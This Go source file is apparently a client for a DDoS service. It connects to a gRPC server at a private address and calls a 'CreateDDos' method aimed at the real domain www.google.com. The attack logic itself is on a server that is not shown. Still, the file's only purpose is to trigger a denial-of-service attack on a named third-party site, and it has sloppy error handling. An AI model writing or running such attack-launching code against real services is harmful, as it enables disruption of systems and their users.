package main

import (
	"context"
	"fmt"
	"log"
	"math/rand"
	"time"

	ddospb "github.com/cloverway/schema/pbgo/v2/ddos"
	"google.golang.org/grpc"
)

func main() {
	rand.Seed(time.Now().Unix())

	// dial server
	conn, err := grpc.Dial("192.168.86.60:8080", grpc.WithInsecure())
	if err != nil {
		log.Fatalf("can not connect with server %v", err)
	}

	ctx := context.Background()
	// create stream
	client := ddospb.NewDdoSServiceClient(conn)

	res, err := client.CreateDDos(
		ctx,
		&ddospb.CreateRequest{
			Url: "www.google.com",
		},
	)

	if err != nil {
		fmt.Print("NO error in running clinet", err)
	}
	fmt.Println("Res. clinet", res)
}
